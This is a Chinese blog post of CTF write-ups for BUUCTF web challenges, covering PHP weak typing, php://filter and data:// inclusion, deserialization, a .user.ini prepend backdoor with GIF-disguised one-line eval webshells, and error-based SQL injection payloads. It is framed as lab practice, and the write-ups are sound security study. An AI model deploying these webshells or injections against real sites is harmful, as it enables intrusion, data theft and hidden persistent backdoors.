+<h2 id="极客大挑战-2019-BuyFlag"><a href="#极客大挑战-2019-BuyFlag" class="headerlink" title="[极客大挑战 2019]BuyFlag"></a>[极客大挑战 2019]BuyFlag</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608057575-29192fe0-ae22-4e27-82d4-57a44c6894ee.png#height=515&id=tFRDI&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1030&originWidth=1920&originalType=binary&ratio=1&size=279195&status=done&style=none&width=960" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628606804168-f5456cf7-25d8-4dee-8bfd-5086a228fd17.png#height=51&id=Mfl8Z&margin=%5Bobject%20Object%5D&name=image.png&originHeight=101&originWidth=948&originalType=binary&ratio=1&size=14183&status=done&style=none&width=474" srcset="/img/loading.gif" lazyload alt="image.png"><br>显而易见，把user改成1试一下:<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628606875711-ba5446f0-e4a4-4d99-8fd6-c3a2993c4e3e.png#height=101&id=MfRhD&name=image.png&originHeight=101&originWidth=927&originalType=binary&ratio=1&size=14377&status=done&style=none&width=927" srcset="/img/loading.gif" lazyload alt="image.png">    <br>post参数password进去:<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628606928855-9f577089-21a2-4d40-a238-638b0ec9a27c.png#height=117&id=aGeO0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=233&originWidth=475&originalType=binary&ratio=1&size=39034&status=done&style=none&width=237.5" srcset="/img/loading.gif" lazyload alt="image.png"><strong>就是先看到的这里 用hackbar post传参</strong><br>让我们post过去一个money和一个password，password要等于404，并且password不能为数字，那好办我们可以用弱类型，即让password&#x3D;404a。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608109425-9efff7c1-cccd-406f-b4fa-0fb82ed586f1.png#height=483&id=NmBv2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=966&originWidth=1264&originalType=binary&ratio=1&size=165731&status=done&style=none&width=632" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608126484-4c304e2d-6048-4e5a-9062-640181d665a3.png#height=22&id=u1nlB&margin=%5Bobject%20Object%5D&name=image.png&originHeight=43&originWidth=300&originalType=binary&ratio=1&size=2598&status=done&style=none&width=150" srcset="/img/loading.gif" lazyload alt="image.png"> 开始传钱数<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628608171114-2bc16e9e-22dd-48e8-b747-7319f48716fa.png#height=483&id=Gm4y2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=966&originWidth=1264&originalType=binary&ratio=1&size=164310&status=done&style=none&width=632" srcset="/img/loading.gif" lazyload alt="image.png"><br>用科学计数法 money&#x3D;1e9  得到flag</p>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628654937600-60fe647c-1d05-4211-96ed-70064d34b755.png#height=180&id=kAZKU&margin=%5Bobject%20Object%5D&name=image.png&originHeight=359&originWidth=800&originalType=binary&ratio=1&size=18983&status=done&style=none&width=400" srcset="/img/loading.gif" lazyload alt="image.png"><br>打开题目得到源码<br><strong>第一个绕过：</strong><br>if(isset($text)&amp;&amp;(file_get_contents($text,’r’)&#x3D;&#x3D;&#x3D;”welcome to the zjctf”))<br>这里需要我们传入一个文件且其内容为welcome to the zjctf，这样的话往后面看没有其他可以利用的点，我们就无法写入文件再读取，就剩下了一个data伪协议。data协议通常是用来执行PHP代码，然而我们也可以将内容写入data协议中然后让file_get_contents函数取读取。构造如下：<br>text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;<br>当然也可以不需要base64，但是一般为了绕过某些过滤都会用到base64。data:&#x2F;&#x2F;text&#x2F;plain,welcome to the zjctf<br><strong>第二个绕过</strong><br>$file &#x3D; $_GET[“file”];<br>if(preg_match(“&#x2F;flag&#x2F;“,$file)){<br>         echo “Not now!”;<br>         exit();<br>     }else{<br>               include($file);  &#x2F;&#x2F;useless.php<br>               $password &#x3D; unserialize($password);<br>               echo $password;<br>     }<br>这里有file参数可控，但是无法直接读取flag，可以直接读取&#x2F;etc&#x2F;passwd，但针对php文件我们需要进行base64编码，否则读取不到其内容，所以以下无法使用：<br>file&#x3D;useless.php<br>所以下面采用filter来读源码，但上面提到过针对php文件需要base64编码，所以使用其自带的base64过滤器。<br>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php<br>利用php伪协议filter读取useless.php<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628677244825-bc4ba01d-f1cf-4164-9096-715e00e8ef2b.png#height=473&id=EIWY2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=946&originWidth=1264&originalType=binary&ratio=1&size=128257&status=done&style=none&width=632" srcset="/img/loading.gif" lazyload alt="image.png"><br>读到的useless.php内容如下：<br><?php  
+class Flag{  //flag.php  
+    public $file;  
+    public function __tostring(){  
+        if(isset($this->file)){  
+            echo file_get_contents($this->file);  
+            echo "<br>";
+        return ("U R SO CLOSE !///COME ON PLZ");
+        }  
+    }  
+}  
+?>  <br>先进行序列化，得到序列化后字符串格式<br><?php
+  class Flag{  //flag.php      
+public $file="flag.php";       
+public function __tostring(){           
+if(isset($this->file)){               
+echo file_get_contents($this->file);              
+echo "<br>";         
+return ("U R SO CLOSE !///COME ON PLZ");
+         }
+       }   
+}   
+$a = new   Flag();
+echo serialize($a);
+?><br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628677486872-f2571c9c-ed3c-4301-a57e-bfd24330eddf.png#height=262&id=N3Jtn&margin=%5Bobject%20Object%5D&name=image.png&originHeight=524&originWidth=1478&originalType=binary&ratio=1&size=68891&status=done&style=none&width=739" srcset="/img/loading.gif" lazyload alt="image.png"><br>O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628677988997-6000ddbb-ad8a-4442-98b0-8040a25943f7.png#height=270&id=YNOnH&margin=%5Bobject%20Object%5D&name=image.png&originHeight=539&originWidth=1233&originalType=binary&ratio=1&size=71754&status=done&style=none&width=616.5" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628686686122-67383f8f-2a33-446e-852c-7a279b11c089.png#height=89&id=ZBCVx&margin=%5Bobject%20Object%5D&name=image.png&originHeight=177&originWidth=1179&originalType=binary&ratio=1&size=9724&status=done&style=none&width=589.5" srcset="/img/loading.gif" lazyload alt="image.png"><br><code>.user.ini</code>。它比<code>.htaccess</code>用的更广，不管是nginx&#x2F;apache&#x2F;IIS，只要是以fastcgi运行的php都可以用这个方法。我的nginx服务器全部是fpm&#x2F;fastcgi，我的IIS php5.3以上的全部用的fastcgi&#x2F;cgi，我win下的apache上也用的fcgi，可谓很广，不像.htaccess有局限性。</p>
+<h2 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h2><p><strong>那么什么是.user.ini？</strong><br>这得从php.ini说起了。php.ini是php默认的配置文件，其中包括了很多php的配置，这些配置中，又分为几种：<code>PHP_INI_SYSTEM</code>、<code>PHP_INI_PERDIR</code>、<code>PHP_INI_ALL</code>、<code>PHP_INI_USER</code>。<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628737812429-c208019e-e686-4620-bcc1-58c5985fbc7f.png#height=205&id=wcGuK&originHeight=205&originWidth=850&originalType=binary&ratio=1&size=0&status=done&style=none&width=850" srcset="/img/loading.gif" lazyload><br>其中就提到了，模式为PHP_INI_USER的配置项，可以在ini_set()函数中设置、注册表中设置，再就是.user.ini中设置。 这里就提到了.user.ini，那么这是个什么配置文件？那么官方文档在<a target="_blank" rel="noopener" href="http://php.net/manual/zh/configuration.file.per-user.php">这里</a>又解释了：</p>
+<p>除了主 php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web 根目录（<code>$_SERVER[&#39;DOCUMENT_ROOT&#39;]</code> 所指定的）。如果被执行的 PHP 文件在 web 根目录之外，则只扫描该目录。</p>
+<p>在 <code>.user.ini</code> 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI 设置可被识别。</p>
+<p>这里就很清楚了，<code>.user.ini</code>实际上就是一个可以由用户“自定义”的php.ini，我们能够自定义的设置是模式为“PHP_INI_PERDIR 、 PHP_INI_USER”的设置。（上面表格中没有提到的PHP_INI_PERDIR也可以在.user.ini中设置）</p>
+<p>实际上，除了<code>PHP_INI_SYSTEM</code>以外的模式（包括PHP_INI_ALL）都是可以通过.user.ini来设置的。</p>
+<p>而且，和<code>php.ini</code>不同的是，<code>.user.ini</code>是一个能被动态加载的ini文件。也就是说我修改了<code>.user.ini</code>后，不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>然后我们看到php.ini中的配置项，可惜我沮丧地发现，只要稍微敏感的配置项，都是<code>PHP_INI_SYSTEM</code>模式的（甚至是php.ini only的），包括<code>disable_functions</code>、<code>extension_dir</code>、<code>enable_dl</code>等。 不过，我们可以很容易地借助<code>.user.ini</code>文件来构造一个“后门”。</p>
+<p><code>auto_append_file</code>、<code>auto_prepend_file</code><br>指定一个文件，自动包含在要执行的文件前，类似于在文件前调用了require()函数。而auto_append_file类似，只是在文件后面包含。 使用方法很简单，直接写在.user.ini中：</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=<span class="hljs-number">01</span>.gif<br></code></pre></td></tr></table></figure>
+<p>01.gif是要包含的文件。<br>所以，我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。<br>测试一下，我分别在IIS6.0+Fastcgi+PHP5.3和nginx+fpm+php5.3上测试。 目录下有.user.ini，和包含webshell的01.gif，和正常php文件echo.php：<br>访问echo.php即可看到后门：<br>那么，我们可以想一下，在哪些情况下可以用到这个姿势？ 比如，某网站限制不允许上传.php文件，你便可以上传一个.user.ini，再上传一个图片马，包含起来进行getshell。不过前提是含有.user.ini的文件夹下需要有正常的php文件，否则也不能包含了。 再比如，你只是想隐藏个后门，这个方式是最方便的。</p>
+<p>​</p>
+<p>所以，<strong>我们可以借助.user.ini轻松让所有php文件都“自动”包含某个文件，而这个文件可以是一个正常php文件，也可以是一个包含一句话的webshell。</strong></p>
+<h3 id="一：上传user-ini"><a href="#一：上传user-ini" class="headerlink" title="一：上传user.ini"></a>一：上传user.ini</h3><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-bullet">1.</span> GIF89a<br><span class="hljs-bullet">2.</span> auto<span class="hljs-emphasis">_prepend_</span>file=1.jpg<br></code></pre></td></tr></table></figure>
+<p> 前面要加上GIF89a，来绕过检测。</p>
+<h3 id="二：上传1-jpg"><a href="#二：上传1-jpg" class="headerlink" title="二：上传1.jpg"></a>二：上传1.jpg</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml">1. GIF89a?<br>2. <span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;php&quot;</span>&gt;</span><span class="language-javascript"><span class="hljs-built_in">eval</span>($_GET[<span class="hljs-string">&#x27;cmd&#x27;</span>]);</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1628742729854-957de866-3088-4861-861f-d33aec16e75a.png#height=496&id=bPXm8&margin=%5Bobject%20Object%5D&name=image.png&originHeight=992&originWidth=1264&originalType=binary&ratio=1&size=167889&status=done&style=none&width=632" srcset="/img/loading.gif" lazyload alt="image.png"><br> 然后 通过蚁剑连接</p>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><p>报错注入<br>简单测试一下：<br>发现union被直接过滤掉了，不能使用双写绕过等方式，不过我们可以使用报错注入进行注入可以使用extractvalue和updatexml进行报错注入<br>这题目还过滤了空格和and  用括号来代替空格就能绕过了<br>百度了web 的骚操作<br>用’^来连接函数，形成异或<br>这边用的是extractvalue（）<br>playload:<code>username=admin&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(database()))))%23</code><br>爆出当前库名<br>查询表名<br>playload:<code>username=admin&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables))))%23</code><br>然后试试查询geek库里的表<br>这个网址还过滤了等于号emmm，又是一个骚操作，用like代替‘&#x3D;’<br>playload:username&#x3D;admin&amp;password&#x3D;1’^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where((table_schema)like(‘geek’)))))%23</p>
+<p>继续查<br>playload:username&#x3D;admin&amp;password&#x3D;1’^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where((table_name)like(‘H4rDsq1’)))))%23</p>
+<p>继续<br>playload:<code>username=admin&amp;password=1&#39;^extractvalue(1,concat(0x7e,(select(password)from(geek.H4rDsq1))))%23</code><br>substr过滤了不能用<br>发现得到的flag不全<br>flag{fcbe8fe9-3970-435a-a545-a5<br>另外一个骚操作{left(),right()}</p>
+<p>playload:username&#x3D;44&amp;password&#x3D;1%27^extractvalue(1,concat(0x7e,(select(left(password,30))from(geek.H4rDsq1))))%23<br>playload:username&#x3D;44&amp;password&#x3D;1%27^extractvalue(1,concat(0x7e,(select(right(password,30))from(geek.H4rDsq1))))%23<br>9-3970-435a-a545-a51c7daf7e0a}</p>
+<h1 id="1-upload"><a href="#1-upload" class="headerlink" title="1, upload"></a>1, upload</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625576668516-91c69911-44f6-467a-b9c0-83283418d50d.png#height=323&id=u531a6d11&margin=%5Bobject%20Object%5D&name=image.png&originHeight=646&originWidth=1424&originalType=binary&ratio=1&size=1413360&status=done&style=none&width=712" srcset="/img/loading.gif" lazyload alt="image.png"><br>是文件上传漏洞，所以我们先随便上传一个jpg图片，查看回显<br>然后上传php，了解一下php与phtml的区别，<br> PHTML（有时叫做PHP）网页是一种包含PHP（一种和JavaScript或 Microsoft VBScript类似的语言）脚本的网页和ASP一样，PHP脚本镶嵌在网页的HTML代码之中。在页面被发送给请求的用户之前，网页服务器调用PHP解释程序来解释和执行PHP脚本。含有PHP脚本的网页通常都以“.php”、“.php3”或“.phtml”作为后缀。和ASP一样，PHP可以被认为是一种“动态网页”。<br>创建一个PHTML文件，在里面输入内容 （GIF89a 是图片的请求头欺骗）</p>
+<p>GIF89a</p>
+<script language="php">eval($_POST["a"]);</script>
+
+
+<p>上传用bp拦截<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625578708671-7d60faaa-23b7-47e0-8749-5df39da50783.png#height=295&id=ue30ab418&margin=%5Bobject%20Object%5D&name=image.png&originHeight=590&originWidth=1154&originalType=binary&ratio=1&size=61043&status=done&style=none&width=577" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p> 将这里进行修改<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625578973156-319cea12-c88f-49ca-86d8-8997822fc9d9.png#height=496&id=u0c7486ce&margin=%5Bobject%20Object%5D&name=image.png&originHeight=992&originWidth=1264&originalType=binary&ratio=1&size=154791&status=done&style=none&width=632" srcset="/img/loading.gif" lazyload alt="image.png"><br>上传成功，然后通过蚁剑连接，&#x2F;upload文件下的1.phtml文件<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625579493050-f9136f88-601a-4187-956c-d82fe3914e1c.png#height=432&id=u68c71257&margin=%5Bobject%20Object%5D&name=image.png&originHeight=863&originWidth=1284&originalType=binary&ratio=1&size=84189&status=done&style=none&width=642" srcset="/img/loading.gif" lazyload alt="image.png"><br>源代码如下<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625579627952-b6b3e54b-83cd-46cb-a078-6026c5873c74.png#height=130&id=u03381c6a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=260&originWidth=815&originalType=binary&ratio=1&size=33693&status=done&style=none&width=407.5" srcset="/img/loading.gif" lazyload alt="image.png"><br>在flag根目录找到flag<br><img src="https://cdn.nlark.com/yuque/0/2021/png/20356902/1625580819996-0768a9ea-8bec-46a1-bbf1-6d2a0235ef5a.png#height=421&id=ub89bb2f7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=842&originWidth=1284&originalType=binary&ratio=1&size=142321&status=done&style=none&width=642" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>BUU继续刷题</div>
+      <div>http://example.com/2023/04/20/BUU继续刷题/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>H0ne</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2023年4月20日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2023/04/20/CSRF%E5%92%8CSSRF/" title="CSRF&amp;&amp;SSRF">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CSRF&amp;&amp;SSRF</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/04/20/BUUCTF/" title="BUUCTF">
+                        <span class="hidden-mobile">BUUCTF</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicRibbon.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
